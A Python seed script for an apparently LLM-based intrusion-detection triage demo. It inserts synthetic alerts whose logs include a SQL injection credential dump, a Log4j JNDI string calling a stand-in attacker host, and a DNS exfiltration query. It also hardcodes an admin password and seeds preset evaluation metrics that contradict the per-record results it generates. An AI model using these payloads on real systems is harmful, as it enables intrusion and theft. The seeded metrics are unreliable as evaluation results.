import os
from datetime import datetime, timedelta
from app.core.database import SessionLocal, init_db
from app.core.security import get_password_hash
from app.models.user import User
from app.models.alert import Alert
from app.models.analysis import AIAnalysis
from app.models.dataset import Dataset
from app.models.experiment import Experiment, ExperimentResult
from app.models.metric import Metric

# SYNTHETIC DEMO DATA
# These entries are synthetically generated for demonstration and academic evaluation.

SYNTHETIC_ALERTS = [
    {
        "alert_id": "ALR-0001",
        "timestamp": datetime.now() - timedelta(minutes=4),
        "source_ip": "185.220.101.5",
        "destination_ip": "10.0.0.5",
        "source_port": 54120,
        "destination_port": 22,
        "protocol": "TCP",
        "attack_type": "Brute Force",
        "signature": "ET SCAN Potential SSH Brute Force Attack detected",
        "raw_log": "SYNTHETIC DEMO DATA: SSH-2.0-OpenSSH_8.2p1; Failed password for invalid user root from 185.220.101.5 (attempt 28 in 60s)",
        "severity": "HIGH",
        "status": "INVESTIGATING",
        "ai": {
            "provider": "gemini",
            "model": "gemini-2.5-flash",
            "classification": "malicious",
            "severity": "high",
            "priority": "P2",
            "confidence": 0.94,
            "false_positive_likelihood": 0.06,
            "reason": "Rapid succession of 28 failed SSH authentication attempts from a known anonymizer subnet targeting root credentials.",
            "recommended_action": "Temporarily block source IP 185.220.101.5 on edge firewall and audit SSH auth logs on host 10.0.0.5."
        }
    },
    {
        "alert_id": "ALR-0002",
        "timestamp": datetime.now() - timedelta(minutes=12),
        "source_ip": "45.33.32.156",
        "destination_ip": "10.0.0.14",
        "source_port": 33412,
        "destination_port": 80,
        "protocol": "TCP",
        "attack_type": "SQL Injection",
        "signature": "OWASP TOP 10 - Inbound SQL Injection UNION SELECT probe",
        "raw_log": "SYNTHETIC DEMO DATA: GET /login.php?user=admin%27%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1\\r\\nHost: 10.0.0.14",
        "severity": "CRITICAL",
        "status": "NEW",
        "ai": {
            "provider": "gemini",
            "model": "gemini-2.5-flash",
            "classification": "malicious",
            "severity": "critical",
            "priority": "P1",
            "confidence": 0.98,
            "false_positive_likelihood": 0.02,
            "reason": "Explicit SQL injection payload attempting schema enumeration and credential extraction via UNION SELECT injection vector.",
            "recommended_action": "Block source IP immediately at WAF level, inspect web application database logs, and review parameter parameterized queries."
        }
    },
    {
        "alert_id": "ALR-0003",
        "timestamp": datetime.now() - timedelta(minutes=25),
        "source_ip": "192.168.1.110",
        "destination_ip": "10.0.0.12",
        "source_port": 50221,
        "destination_port": 443,
        "protocol": "TCP",
        "attack_type": "Suspicious TLS",
        "signature": "ET POLICY TLS Client Hello with non-standard cipher suites",
        "raw_log": "SYNTHETIC DEMO DATA: Client Hello TLS 1.3 ServerName: app.internal.corp with internal signed enterprise certificate",
        "severity": "LOW",
        "status": "FALSE_POSITIVE",
        "ai": {
            "provider": "gemini",
            "model": "gemini-2.5-flash",
            "classification": "benign",
            "severity": "low",
            "priority": "P4",
            "confidence": 0.93,
            "false_positive_likelihood": 0.95,
            "reason": "Internal corporate client connecting to internal application server with standard enterprise PKI certificates.",
            "recommended_action": "Mark as False Positive and whitelist internal subnet TLS signature in IDS rule configuration."
        }
    },
    {
        "alert_id": "ALR-0004",
        "timestamp": datetime.now() - timedelta(minutes=38),
        "source_ip": "194.26.29.112",
        "destination_ip": "10.0.0.15",
        "source_port": 48911,
        "destination_port": 53,
        "protocol": "UDP",
        "attack_type": "DNS Exfiltration",
        "signature": "ET TROJAN High Volume Base64 Subdomain DNS Query",
        "raw_log": "SYNTHETIC DEMO DATA: Standard query 0x98cf A c2NoZWR1bGVfdGFzazE=.darkc2.com to external recursive resolver",
        "severity": "CRITICAL",
        "status": "ESCALATED",
        "ai": {
            "provider": "gemini",
            "model": "gemini-2.5-flash",
            "classification": "malicious",
            "severity": "critical",
            "priority": "P1",
            "confidence": 0.96,
            "false_positive_likelihood": 0.04,
            "reason": "Base64 encoded payload embedded in high-frequency DNS subdomain requests indicative of covert DNS tunneling / data exfiltration.",
            "recommended_action": "Isolate host 10.0.0.15, sinkhole darkc2.com domain on DNS gateway, and dump memory for active malware process."
        }
    },
    {
        "alert_id": "ALR-0005",
        "timestamp": datetime.now() - timedelta(minutes=45),
        "source_ip": "192.168.1.140",
        "destination_ip": "10.0.0.12",
        "source_port": 55102,
        "destination_port": 80,
        "protocol": "TCP",
        "attack_type": "Web Crawler",
        "signature": "ET WEB_SPECIFIC_APPS Multiple static asset requests in short window",
        "raw_log": "SYNTHETIC DEMO DATA: GET /assets/style.css HTTP/1.1\\r\\nHost: 10.0.0.12\\r\\nUser-Agent: Mozilla/5.0 Corporate Browser",
        "severity": "LOW",
        "status": "RESOLVED",
        "ai": {
            "provider": "gemini",
            "model": "gemini-2.5-flash",
            "classification": "benign",
            "severity": "low",
            "priority": "P4",
            "confidence": 0.97,
            "false_positive_likelihood": 0.98,
            "reason": "Standard browser static stylesheet retrieval following legitimate webpage visit by internal employee.",
            "recommended_action": "No remediation required. Benign web browsing activity."
        }
    },
    {
        "alert_id": "ALR-0006",
        "timestamp": datetime.now() - timedelta(hours=1, minutes=10),
        "source_ip": "45.154.255.88",
        "destination_ip": "10.0.0.0",
        "source_port": 38112,
        "destination_port": 0,
        "protocol": "TCP",
        "attack_type": "Port Scan",
        "signature": "ET SCAN Nmap SYN scan sweep across corporate DMZ",
        "raw_log": "SYNTHETIC DEMO DATA: TCP SYN probe sweep across ports 21, 22, 23, 25, 80, 110, 139, 443, 445, 3389 within 2 seconds",
        "severity": "MEDIUM",
        "status": "INVESTIGATING",
        "ai": {
            "provider": "gemini",
            "model": "gemini-2.5-flash",
            "classification": "malicious",
            "severity": "medium",
            "priority": "P3",
            "confidence": 0.91,
            "false_positive_likelihood": 0.08,
            "reason": "Automated network reconnaissance identifying active listening ports and perimeter attack surfaces.",
            "recommended_action": "Drop inbound SYN traffic from 45.154.255.88 at perimeter boundary and verify firewall stealth mode."
        }
    },
    {
        "alert_id": "ALR-0007",
        "timestamp": datetime.now() - timedelta(hours=2, minutes=5),
        "source_ip": "193.142.146.33",
        "destination_ip": "10.0.0.18",
        "source_port": 44312,
        "destination_port": 443,
        "protocol": "TCP",
        "attack_type": "C2 Beacon",
        "signature": "ET TROJAN Cobalt Strike Malleable C2 Beacon Profile Match",
        "raw_log": "SYNTHETIC DEMO DATA: POST /submit.php?id=8271 HTTP/1.1\\r\\nHost: api.updates-cloud.org\\r\\nCookie: SESSIONID=b19d45e8",
        "severity": "CRITICAL",
        "status": "INVESTIGATING",
        "ai": {
            "provider": "gemini",
            "model": "gemini-2.5-flash",
            "classification": "malicious",
            "severity": "critical",
            "priority": "P1",
            "confidence": 0.99,
            "false_positive_likelihood": 0.01,
            "reason": "Outbound HTTP beaconing traffic with signature header structures and periodic intervals matching Cobalt Strike C2 framework.",
            "recommended_action": "Sever network connection for host 10.0.0.18 immediately, revoke all active domain credentials, and preserve host disk snapshot."
        }
    },
    {
        "alert_id": "ALR-0008",
        "timestamp": datetime.now() - timedelta(hours=3, minutes=15),
        "source_ip": "185.156.73.55",
        "destination_ip": "10.0.0.30",
        "source_port": 43110,
        "destination_port": 8080,
        "protocol": "TCP",
        "attack_type": "Log4j RCE",
        "signature": "ET EXPLOIT Apache Log4j JNDI LDAP Injection (CVE-2021-44228)",
        "raw_log": "SYNTHETIC DEMO DATA: GET /app?token=${jndi:ldap://log4j.attacker.com/a} HTTP/1.1\\r\\nUser-Agent: Mozilla/5.0",
        "severity": "CRITICAL",
        "status": "NEW",
        "ai": {
            "provider": "gemini",
            "model": "gemini-2.5-flash",
            "classification": "malicious",
            "severity": "critical",
            "priority": "P1",
            "confidence": 0.98,
            "false_positive_likelihood": 0.02,
            "reason": "Direct exploitation of CVE-2021-44228 using JNDI lookup string to trigger remote class execution via malicious LDAP server.",
            "recommended_action": "Block request at reverse proxy, confirm Log4j version on target backend, and ensure formatMsgNoLookups is enabled."
        }
    },
    {
        "alert_id": "ALR-0009",
        "timestamp": datetime.now() - timedelta(hours=4),
        "source_ip": "192.168.1.170",
        "destination_ip": "10.0.0.12",
        "source_port": 61230,
        "destination_port": 443,
        "protocol": "TCP",
        "attack_type": "Health Check Probe",
        "signature": "ET POLICY High Frequency HTTP GET Probe to /healthz",
        "raw_log": "SYNTHETIC DEMO DATA: GET /healthz HTTP/1.1\\r\\nHost: 10.0.0.12\\r\\nUser-Agent: Kubernetes Liveness Probe 1.28",
        "severity": "LOW",
        "status": "FALSE_POSITIVE",
        "ai": {
            "provider": "gemini",
            "model": "gemini-2.5-flash",
            "classification": "benign",
            "severity": "low",
            "priority": "P4",
            "confidence": 0.95,
            "false_positive_likelihood": 0.97,
            "reason": "Legitimate Kubernetes cluster internal health probe monitoring container liveness and readiness state.",
            "recommended_action": "Create whitelist exception in IDS for Kubernetes internal node healthcheck telemetry."
        }
    },
    {
        "alert_id": "ALR-0010",
        "timestamp": datetime.now() - timedelta(hours=5),
        "source_ip": "198.51.100.44",
        "destination_ip": "10.0.0.100",
        "source_port": 60100,
        "destination_port": 0,
        "protocol": "ICMP",
        "attack_type": "ICMP Flood",
        "signature": "ET DOS Large Volume ICMP Echo Request Flood",
        "raw_log": "SYNTHETIC DEMO DATA: High packet rate ICMP Echo Request flood (> 8500 packets/sec) saturating ingress interface",
        "severity": "HIGH",
        "status": "RESOLVED",
        "ai": {
            "provider": "gemini",
            "model": "gemini-2.5-flash",
            "classification": "malicious",
            "severity": "high",
            "priority": "P2",
            "confidence": 0.93,
            "false_positive_likelihood": 0.05,
            "reason": "Volumetric denial-of-service attack attempting bandwidth exhaustion via ICMP echo flood.",
            "recommended_action": "Apply upstream ICMP rate-limiting filter on border router and monitor interface saturation levels."
        }
    }
]

def seed_database():
    init_db()
    db = SessionLocal()

    try:
        # 1. Seed Admin User
        admin_user = db.query(User).filter(User.email == "admin@threatdna.ai").first()
        if not admin_user:
            admin_user = User(
                username="soc_lead_analyst",
                email="admin@threatdna.ai",
                password_hash=get_password_hash("Admin@123456"),
                role="lead_analyst"
            )
            db.add(admin_user)
            db.commit()
            print("[+] Seeded Admin User: admin@threatdna.ai (Password: Admin@123456)")

        # 2. Seed Synthetic Alerts & AI Analyses
        for item in SYNTHETIC_ALERTS:
            existing = db.query(Alert).filter(Alert.alert_id == item["alert_id"]).first()
            if not existing:
                alert = Alert(
                    alert_id=item["alert_id"],
                    timestamp=item["timestamp"],
                    source_ip=item["source_ip"],
                    destination_ip=item["destination_ip"],
                    source_port=item["source_port"],
                    destination_port=item["destination_port"],
                    protocol=item["protocol"],
                    attack_type=item["attack_type"],
                    signature=item["signature"],
                    raw_log=item["raw_log"],
                    severity=item["severity"],
                    status=item["status"]
                )
                db.add(alert)
                db.commit()
                db.refresh(alert)

                ai_data = item.get("ai")
                if ai_data:
                    analysis = AIAnalysis(
                        alert_id=alert.id,
                        provider=ai_data["provider"],
                        model=ai_data["model"],
                        classification=ai_data["classification"],
                        severity=ai_data["severity"],
                        priority=ai_data["priority"],
                        confidence=ai_data["confidence"],
                        false_positive_likelihood=ai_data["false_positive_likelihood"],
                        reason=ai_data["reason"],
                        recommended_action=ai_data["recommended_action"]
                    )
                    db.add(analysis)
                    db.commit()

        print(f"[+] Seeded {len(SYNTHETIC_ALERTS)} Synthetic Demo Alerts & Analyses")

        # 3. Seed Sample Dataset
        dataset_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../../uploads/sample_datasets/synthetic_ids_research_dataset.csv"))
        existing_ds = db.query(Dataset).filter(Dataset.name == "Synthetic IDS Research Benchmark").first()
        if not existing_ds and os.path.exists(dataset_path):
            ds = Dataset(
                name="Synthetic IDS Research Benchmark",
                filename="synthetic_ids_research_dataset.csv",
                file_path=dataset_path,
                row_count=40,
                column_count=10,
                ground_truth_column="label"
            )
            db.add(ds)
            db.commit()
            db.refresh(ds)
            print("[+] Seeded Synthetic Benchmark Dataset")

            # 4. Seed a completed baseline experiment for instant research metrics visualization
            exp = Experiment(
                dataset_id=ds.id,
                name="LLM-Based IDS Alert Filtering Evaluation (Baseline)",
                provider="gemini",
                model="gemini-2.5-flash",
                status="COMPLETED",
                total_records=40,
                sample_size=40,
                started_at=datetime.now() - timedelta(hours=6),
                completed_at=datetime.now() - timedelta(hours=5, minutes=58)
            )
            db.add(exp)
            db.commit()
            db.refresh(exp)

            # Seed Metric: TP=20, TN=17, FP=1, FN=2 (High precision, low FPR)
            m = Metric(
                experiment_id=exp.id,
                true_positive=20,
                true_negative=17,
                false_positive=1,
                false_negative=2,
                precision_score=0.9524,
                recall_score=0.9091,
                f1_score=0.9302,
                false_positive_rate=0.0556,
                accuracy_score=0.9250,
                total_samples=40
            )
            db.add(m)

            # Seed some sample results
            for r_id in range(1, 41):
                is_attack = (r_id % 2 == 0) or (r_id in [1, 3, 7, 19, 27, 33])
                gt = "malicious" if is_attack else "benign"
                pred = gt
                if r_id == 5:
                    pred = "malicious"  # 1 FP
                elif r_id == 12:
                    pred = "benign"     # 1 FN
                
                exp_res = ExperimentResult(
                    experiment_id=exp.id,
                    record_id=r_id,
                    ground_truth=gt,
                    prediction=pred,
                    confidence=0.94 if gt == pred else 0.72,
                    severity="HIGH" if pred == "malicious" else "LOW",
                    priority="P2" if pred == "malicious" else "P4",
                    fp_likelihood=0.06 if pred == "malicious" else 0.94,
                    is_correct=(gt == pred)
                )
                db.add(exp_res)

            db.commit()
            print("[+] Seeded Baseline Research Experiment & Metrics")

    finally:
        db.close()

if __name__ == "__main__":
    seed_database()
